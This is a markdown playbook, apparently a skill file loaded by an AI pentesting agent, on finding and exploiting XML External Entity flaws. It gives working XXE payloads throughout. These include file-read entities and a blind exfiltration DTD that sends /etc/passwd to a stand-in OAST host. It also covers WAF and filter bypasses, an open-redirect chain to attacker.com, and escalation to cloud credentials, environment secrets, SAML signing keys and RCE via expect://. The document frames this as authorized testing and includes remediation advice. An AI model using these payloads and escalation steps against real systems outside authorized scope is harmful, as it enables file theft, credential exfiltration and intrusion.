---
slug: xxe
applies_to: [pentester, coder]
owasp: A05
related: [ssrf, information_disclosure, rce]
---

# XML External Entity — Pentester Playbook

> Load this when recon flagged any endpoint that parses XML, SOAP, SVG,
> DOCX/XLSX/PPTX, RSS, Atom, SAML responses, OOXML, or anything that
> ultimately hands XML to a parser.

## When to load this

Endpoints that parse XML and almost always deserve XXE testing:

- SAML SSO assertion handlers (the IdP-side trust is enormous)
- SOAP endpoints (legacy enterprise glue, almost always XXE-vulnerable on first try)
- File upload features accepting DOCX/XLSX/PPTX/ODT/SVG — these are XML inside a zip
- RSS/Atom feed importers
- OAuth/OIDC flows that fetch a discovery document (some still do XML)
- Webhook receivers that accept XML payloads
- PDF generators that take XML/XSL-FO templates

Sleeper endpoints worth probing even when XML isn't obvious:

- JSON APIs that accept `Content-Type: application/xml` as an alternative (most Spring controllers will deserialize either)
- File preview features (an SVG renderer ships an XML parser)
- Excel exporters that accept template uploads

## What you're looking for

XXE comes from one root cause: an XML parser configured to resolve external entities and DTDs (the default in many languages). Three distinct exploit shapes:

- **Classic XXE.** Inline DTD references a file or URL, response echoes back what the parser fetched. The textbook case.
- **Blind XXE.** Parser resolves entities but you never see the body. Confirm via OAST and exfiltrate via parameter entities pointing to your server.
- **Error-based XXE.** Parser resolves entities, doesn't return the body, but emits errors containing the entity content (e.g. "could not load file with content X"). Surprisingly common against Java parsers.

## First moves

In this order — each step is cheap and tells you whether to keep going:

1. **Inline file-read probe.** Send a body that defines an entity reading `/etc/hostname` (small file, predictable content) and references it where the response will echo:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/hostname">]>
   <root>&x;</root>
   ```
   If the hostname appears in the response, you have classic XXE.

2. **OAST callback probe.** Define an entity pointing to your collaborator. If the DNS query lands, the parser is resolving external entities — even if you can't read the response, you have blind XXE:
   ```xml
   <!DOCTYPE root [<!ENTITY x SYSTEM "http://OAST_HOST/xxe-probe">]>
   <root>&x;</root>
   ```

3. **Parameter entity probe.** Some parsers block `SYSTEM` entities in the document body but allow them in the DTD. Host an external DTD and reference it via parameter entity:
   ```xml
   <!DOCTYPE root [<!ENTITY % ext SYSTEM "http://OAST_HOST/x.dtd"> %ext;]>
   <root/>
   ```

4. **Schema reference probe.** XSD/SAX schema fetchers sometimes resolve `schemaLocation` URLs even when entity expansion is off. Send a document referencing a schema on your OAST host and watch for the fetch.

5. **DOCX/SVG upload probe.** If the target accepts uploads, craft a minimal DOCX (a ZIP containing `[Content_Types].xml` and `word/document.xml`) where one of the XML files has an XXE payload. Many doc parsers extract and pass each part through a default XML parser.

## Confirming a hit

You need either a body echo, an OAST callback, or an error message containing the entity content. Don't report on a single signal — the FP rate on "weird parser response" is high.

### Echo-based confirmation
The cleanest case: your entity reads `/etc/hostname` and the hostname appears in the response. Re-run with `/etc/passwd` (Linux) or `C:\Windows\win.ini` (Windows) to confirm the file primitive works on real targets, not just your test file.

### Error-based confirmation
For parsers that don't echo body content but leak file contents in error messages. Java's `SAXParser` is notorious — feed it a malformed entity reference and the resulting `XMLStreamException` often quotes the offending content (including the file you just loaded).

### OAST confirmation
For blind XXE: parameter entity exfiltration via external DTD is the standard pattern:
```xml
<!-- external DTD hosted on your server -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % ext "<!ENTITY &#x25; xxe SYSTEM 'http://OAST_HOST/?d=%data;'>">
%ext;
%xxe;
```
Watch your OAST host's HTTP log for the encoded `/etc/passwd` content as a query parameter.

## Going deeper — by parser

**libxml2 (PHP, Python `lxml`).** Default-on entity resolution in older versions, default-off since libxml2 2.9.0 (~2013) but explicitly re-enabled in tons of apps. Look for `LIBXML_NOENT` flag in PHP, `resolve_entities=True` in lxml.

**Java (Xerces, JAXP, JAXB, SAXParser, Spring's XML adapter).** Historically XXE-on-by-default. Spring auto-deserializes XML when `Content-Type: application/xml` is sent, even to endpoints that expected JSON. Look for `XMLInputFactory`, `DocumentBuilderFactory.newInstance()` without `setFeature(...DISALLOW_DOCTYPE_DECL, true)`.

**.NET (XmlDocument, XmlReader, XmlTextReader).** `XmlDocument.LoadXml` is XXE-vulnerable in .NET < 4.5.2 unless `XmlResolver = null` is set explicitly. `XmlTextReader` in .NET Core/5+ is safe by default but old codebases often pin to vulnerable patterns.

**Python (xml.etree, xml.sax, xml.dom.minidom).** The stdlib `xml.etree.ElementTree` won't resolve external entities by default. `xml.sax` and `xml.dom.minidom` historically would. `lxml` does unless told otherwise. `xmltodict` wraps `expat` which is safe-by-default for entities but still vulnerable to billion-laughs DoS.

**Ruby (Nokogiri, REXML).** Nokogiri honors `Nokogiri::XML::ParseOptions::DTDLOAD` if set. REXML has historical XXE bugs that aren't fixed in every Ruby release.

**Node.js (sax, xml2js, fast-xml-parser).** Most JS XML parsers don't follow external entities at all — XXE in pure-JS stacks is rarer than in JVM/PHP/.NET stacks. The exception is `libxmljs` (bindings to libxml2).

**Specific products.** SAP, IBM WebSphere, Oracle WebLogic, Citrix NetScaler, F5 BIG-IP — all have shipped XXE-vulnerable XML/SOAP endpoints in default configs. If recon fingerprints one of these, XXE goes to the top of your hypothesis queue.

## When filters get in the way

- **DTD blocked but parameter entity allowed.** Host the DTD externally instead of inline (see "Parameter entity probe" above).
- **`file://` blocked.** Try `php://filter/convert.base64-encode/resource=/etc/passwd` (PHP), `jar://` and `netdoc://` (Java), `expect://` (PHP with expect extension).
- **DOCTYPE keyword filtered.** Some WAFs match the literal `<!DOCTYPE` string. Bypass with whitespace tricks (`<!DOC\nTYPE`), case folding (XML is case-sensitive but the parser sometimes isn't), or BOM injection.
- **Allowlist of entity URIs.** Use an open redirect on an allowed host to chain to your malicious DTD: `http://allowed.com/redirect?to=http://attacker.com/x.dtd`.
- **HTTPS-only egress.** If the parser only follows HTTPS URLs (rare but happens with strict corporate proxies), host your DTD on a valid TLS endpoint.
- **Response size limits.** For large file exfil, switch to byte-by-byte extraction via parameter entity loops, or compress the file before reading (some platforms support `compress.zlib://`).

## Escalation paths

XXE that only reads `/etc/hostname` is a medium. Move it up:

1. **File-read escalation.** Read `/etc/passwd`, then `/proc/self/environ` (env vars with API keys), `/app/.env`, `~/.aws/credentials`, `.git/config`, language-specific config files (`web.xml`, `application.properties`, `appsettings.json`).
2. **Source code exfiltration.** `/app/src/...`, `/opt/<app>/.../*.py|*.java|*.rb`. Use the parser-specific base64 wrapper to handle binary content.
3. **SSRF pivot.** XXE is SSRF in disguise — the parser is making outbound HTTP requests on your behalf. Pivot to cloud metadata, internal HTTP APIs, the same playbook as SSRF.
4. **RCE via parser plugins.** PHP's `expect://` gives shell when the expect extension is loaded. Java's `jar://` with a malicious JAR on your server can sometimes load classes. .NET's `XSLT` extensions allow C# eval if XSLT processing is enabled.
5. **SAML-specific.** If the XXE is in a SAML IdP, you may be able to read the IdP's signing key — escalates to identity-impersonation across every app that trusts the IdP.

## What a real finding looks like

The report needs:

- The exact request body that triggers entity resolution (XML payload + Content-Type)
- Proof of external resolution: file content echoed, OAST callback log, or error message quoting the file
- The most sensitive read you achieved within scope (one file is enough; don't dump `/etc/shadow` for fun)
- The library and parser config inferred from behavior ("looks like Java JAXP with `DISALLOW_DOCTYPE_DECL` not set")
- The fix: parser-specific config flag to disable DTD loading entirely. NOT input-side filtering, NOT a WAF rule, NOT entity escaping — disable the feature in the parser.

## Common false positives

- **Parser ignores DTD but doesn't error.** Some parsers silently drop external entities and emit the original `&x;` literal. Confirm by reading a known file with known content; if the content doesn't appear, the parser isn't resolving.
- **OAST callback from the WAF, not the parser.** Some WAFs probe URLs they see in request bodies for analysis. If only DNS arrives but never HTTP, it might be the WAF, not the target parser.
- **Echo from request reflection, not entity resolution.** If the server echoes the request body in the response (a debug feature), the `&x;` token will appear in the echo without being resolved. Test by sending an entity referencing a known-existing file vs an entity referencing nonsense — only the real-file case should produce different output.
- **`xml.etree.ElementTree` documents.** As of Python 3.7.1+ the stdlib parser blocks external entities outright. A negative result against a Python target may just mean they're using the safe stdlib path.

## Related skills

`ssrf` for the network-pivot follow-up, `information_disclosure` for what to do with config files you've read, `rce` for the parser-plugin escalation paths.
